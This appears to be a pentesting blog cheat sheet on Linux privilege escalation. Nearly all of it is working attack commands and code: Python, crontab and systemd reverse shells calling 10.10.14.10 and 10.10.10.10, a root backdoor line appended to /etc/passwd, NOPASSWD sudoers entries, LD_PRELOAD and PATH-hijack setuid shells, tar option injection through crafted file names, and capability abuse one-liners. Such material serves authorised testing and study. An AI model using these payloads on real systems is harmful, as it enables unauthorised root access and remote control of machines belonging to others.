---
title: 6. Privilege escalation - Linux
date: 2024-08-02 14:00:00
categories:
  - Pentesting
  - Linux
tags:
  - Pentesting
  - Linux
  - Privesc
toc: true
---

---
Step 6 in a penetration test: Privilege escalation.
Upgrade permissions, gain access to more resources, become `root`. 

---
<!-- more -->

<br>

## Reverse shell from privileged python script
```python
IP="10.10.14.10"
PORT=4444
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((IP,PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

<br>

## Files with SUID and SGID bit
> SUID (set user ID) and GUID (set group ID) bits are flags set on Linux ELF executables, allowing any user to run them as the owner (impersonate the owner).

**Test**
```bash
# suid
find / -perm -u=s -type f 2>/dev/null
# sgid
find / -perm -u=g -type f 2>/dev/null
# both
find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \; 2>/dev/null
```
Executables you should look for:
```bash
/usr/bin/passwd
/usr/bin/sudo
/bin/su
/usr/bin/chsh
/usr/bin/chfn
/bin/mount
/bin/umount
/usr/bin/locate
/usr/bin/at
```
```bash
/usr/bin/newgrp
/usr/bin/execute
/usr/bin/gpasswd
```

**Exploit**
Example with `doas` executable
```bash
doas -u root /bin/bash
```

<br>

## Edit `/etc/passwd`
> `/etc/passwd` file contains info about user accounts on the machine. Adding an entry (a line) to this file allows us to create a custom user with predefined UID and GID.

**Test**
```bash

```

**Exploit**
Create a user `chronos` with password `chronos`. User and group ID are `0`.
```bash
echo 'chronos:$1$d7venmwO$dSO1eZg6GvVd/ihQLdb6K/:0:0::/root:/bin/bash' >> /etc/passwd
```

<br>

## Append user to sudoers
> `/etc/sudoers` file defines the users who can run commands as `root`. If we can modify it, we can give our current user privileged permissions.

**Test**
```bash
sudo visudo -f /etc/sudoers
```

**Exploit**
Add user to `/etc/sudoers`
```bash
echo 'username        ALL=(ALL)        NOPASSWD: ALL' >> /etc/sudoers
```
Possibilities:
```bash all commands
chronos ALL=(ALL:ALL) ALL
chronos ALL=(root) NOPASSWD: ALL
```
```bash specific command only
chronos ALL=(root) NOPASSWD: /usr/bin/command
```

<br>

## SUDO permissions with preserved environment
> You need to set the PATH variable when running the command

**Test**
```bash
sudo -l
```
```plain
(root) SETENV: NOPASSWD: command
```

**Exploit**
Create a custom script named after the `nopasswd` command
```
echo '/bin/bash -p' > /tmp/command
chmod +x /tmp/command
```
Run it
```bash
sudo PATH=/tmp:$PATH command
```

<br>

## Relative PATH - call to an executable
> A relative PATH vulnerability occurs when a script or binary calls another executable (like service) without specifying its full path. This allows attackers to create a malicious executable with the same name and manipulate the PATH variable to escalate privileges, especially if the vulnerable script is SUID.

**Test**
> Look for scripts/binaries calling executables without full paths
> Imagine `/home/user/vulnerable` calls the `service` binary without specifying the full path
```bash
strings /home/user/vulnerable
```

**Exploit**
Create a custom executable
```bash /tmp/service
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
gcc /tmp/service.c -o /tmp/service
```
Manipulate the `PATH` and execute the vulnerable script/binary
```bash
export PATH=/tmp:$PATH # because our script called service is found in /tmp
/home/user/vulnerable
```

<br>

## Relative PATH - call to a shell function
> This exploit leverages the ability to override a system command with a shell function. When a script or binary calls a command without specifying its full path, you can define a function with the same name to execute malicious code instead. If combined with a SUID binary, this can lead to privilege escalation.

**Test**
> Look for scripts/binaries calling executables without full paths
> Imagine `/home/user/vulnerable` calls the `service` binary without specifying the full path
```bash
strings /home/user/vulnerable
```

**Exploit**
Create a malicious function
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
```
Export the function
```bash
export -f /usr/sbin/service
```
Run the script/binary that calls the service
```bash
/home/user/vulnerable
```

<br>

## LD_PRELOAD SUID
> LD_PRELOAD is an environment variable used in Unix-like operating systems that allows you to specify additional shared libraries to be loaded before others. This can override existing functions in the target programâ€™s shared libraries.

**Test**
```bash
sudo -l
```
```plain
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD
```

**Exploit**
```bash  
env # look for LD_PRELOAD
```
```c /tmp/malicious.c - create a library that overrides the standard one
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
```bash compile the shared library
gcc -fPIC -shared -o /tmp/malicious.so /tmp/malicious.c -nostartfiles
```
```bash set the new library
export LD_PRELOAD=/tmp/malicious.so
printenv LD_PRELOAD
```
```bash run a program such as apache
sudo LD_PRELOAD=/tmp/malicious.so apache2
```

<br>

## Writable crontab
> Define commands that should be executed on the system at regular intervals

**Test**
```bash
(crontab -l; echo "* * * * * /bin/echo 'Crontab is writable' > /tmp/crontab_test") | crontab -
```

**Exploit**
Extract attacker IP
```bash
ip a s
```
Add line to crontab (open `nano` editor)
```bash
crontab -e
```
```bash crontab command
* * * * * python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.10",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

<br>

## Symbolic link (symlinks)
> An attacker can create a symbolic link pointing to a sensitive or writable file (e.g., a file with elevated privileges). If a privileged process or script follows this symlink and modifies the target file, it can lead to unauthorized actions.
> 1. Find a writable directory that is accessible to a user who can exploit it.
2. Identify a script or process running as a privileged user that might follow symbolic links.
3. Create a symbolic link in that writable directory pointing to a sensitive or critical file that the privileged process might interact with.

**Test**
```bash Find writable directories
find / -type d -writable 2>/dev/null
```
```bash List processes with elevated privileges (e.g., cron jobs)
ps aux | grep -E '(crond|atd|systemd|root)'
```

**Exploit**
```bash Create a symlink in a writable directory
cd /tmp
ln -s /etc/passwd /tmp/my_symlink
```
```bash Trigger the privileged process
touch /tmp/my_symlink
```
```bash Verify exploitation
ls -l /etc/passwd
```

<br>

## Import modified `python` module
> Python scripts running with elevated privileges can be exploited if they import modules from directories writable by untrusted users. An attacker can place a malicious library in such a directory to execute arbitrary code with elevated privileges.
> - **Identify the target script**: Find a script running as a privileged user that imports modules.
> - **Writable directory**: Determine if the script imports from a directory writable by non-privileged users.
> - **Create a malicious module**: Place a malicious module in the writable directory.
> - **Exploit**: When the script imports the malicious module, it executes the attacker's code with elevated privileges.

**Test**
Example: `/priv/vuln.py` imports a custom module from writable directory `/home/user`
```python /priv/vuln.py
import some_module
...
```
```bash Module search path for this script
python3 -c "import sys; print(sys.path)"
```
```bash Example outputs
['', '/usr/lib/python3.8', '/usr/lib/python3.8/plat-x86_64-linux-gnu', '/usr/lib/python3.8/lib-dynload', '/home/user/.local/lib/python3.8/site-packages', '/usr/local/lib/python3.8/dist-packages', '/home/user']
```
If one of those is `/home/user` (the writable directory), we can exploit the vulnerable script.

**Exploit**
```bash Create a malicious module
echo "import os; os.system('/bin/bash')" > /home/user/some_module.py
```
```bash Run the privileged script with updated module
sudo python3 /priv/vuln.py
```


<br>

## NFS `no_root_squash` / `no_all_squash`
> `no_root_squash`: Allows root user on NFS client to retain root privileges on the NFS server.
`no_all_squash`: Prevents mapping of all users to anonymous user (nobody), keeping their original privileges.

**Test**
```bash command
cat /etc/exports
```
```plain example output
/home/chronos *(rw,fsid=0,sync,no_root_squash,insecure)
```

**Exploit** - 1. attacker machine
```bash mount the NFS share
mkdir /mnt/nfs
mount -t nfs $IP:/path/to/share /mnt/nfs
```
```bash create a root-owned file and a SUID shell
touch /mnt/nfs/root_owned_file
echo '#!/bin/bash' > /mnt/nfs/suid_shell
echo 'chmod +s /bin/bash' >> /mnt/nfs/suid_shell
chmod +x /mnt/nfs/suid_shell
```
**Exploit** - 2. victim machine
```bash execute the payload
/mnt/nfs/suid_shell
/bin/bash -p
```

<br>

## Linux capabilities
> Linux capabilities allow programs to perform privileged operations without granting full root permissions. When a binary has capabilities like cap_setuid, it can be exploited to gain root privileges. 
This applies to any binary, but we'll use `python` as an example.

**Test**
```bash list capabilities of binaries on the system
getcap -r / 2>/dev/null
```
```plain example output
/usr/bin/python2.6 = cap_setuid+ep
```

**Exploit**
```bash change its user ID to root
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Common binaries wih capabilities
```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```
```bash
ruby -e 'exec "/bin/bash"'
```
```bash
gdb -nx -ex '!sh' -ex quit
```
```bash
cpython -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
```bash
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

<br>

## `tar` wildcard (with cron job)
> **Wildcards in tar**: When `tar` encounters filenames starting with `--`, it treats them as command-line options. This can be exploited to inject tar options like `--checkpoint` and `--checkpoint-action`, which can execute arbitrary commands.
**Cron Job**: The cron job running the vulnerable script executes the `tar` command periodically, triggering the exploit when the special files are present.

**Test**
Identify the vulnerability
```bash example script
cat /home/user/compress.sh
```
```bash compress.sh
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```
Cron job
```bash list cron jobs
crontab -l
```
```bash cron job line
* * * * * /usr/local/bin/compress.sh
```

**Exploit**
Create files with names that `tar` will interpret as options
```bash
# Create a payload script
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh

# Create special files to inject `tar` options
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh\ runme.sh
```

Wait for the cron job to execute
```bash
sleep 60
/tmp/bash -p
```

<br>

## Restart service
> Locate the config file for the respective service and replace _action on reload_ with a reverse shell

**Test**
```bash
sudo -l
```
```plain
(ALL : ALL) /usr/sbin/service vsftpd restart
```

**Exploit**
View the config file for the service (`vsftpd` in this example)
```bash
locate vsftpd.service
```
```plain
/etc/systemd/system/multi-user.target.wants/vsftpd.service
```
Add the attacker IP in the modified service config (reverse shell).
<div style="display: flex; justify-content: space-between;">
  <div style="flex: 1; padding: 2px; min-width: 300px;">
    <p>Default service configuration</p>
    <pre style="overflow-x: auto; white-space: nowrap;">
    ```conf
    [Unit]
    Description=vsftpd FTP server
    After=network.target

    [Service]
    Type=simple
    ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf
    ExecReload=/bin/kill -HUP $MAINPID
    ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty

    [Install]
    WantedBy=multi-user.target
    ```
    </pre>
  </div>
  <div style="flex: 1; padding: 2px; min-width: 300px;">
    <p>Modified service configuration</p>
    <pre style="overflow-x: auto; white-space: nowrap;">
    ```conf
    [Unit]
    Description=vsftpd FTP server
    After=network.target

    [Service]
    User=root
    Type=simple
    ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/443 0>&1'


    [Install]
    WantedBy=multi-user.target
    ```
    </pre>
  </div>
</div>

<br>

## Shell in input prompt
**Test**
```bash script.sh
#!/bin/bash
read -p "What's you name: "
```

**Exploit**
```bash payload
/bin/bash -i
```

<br>

---
---
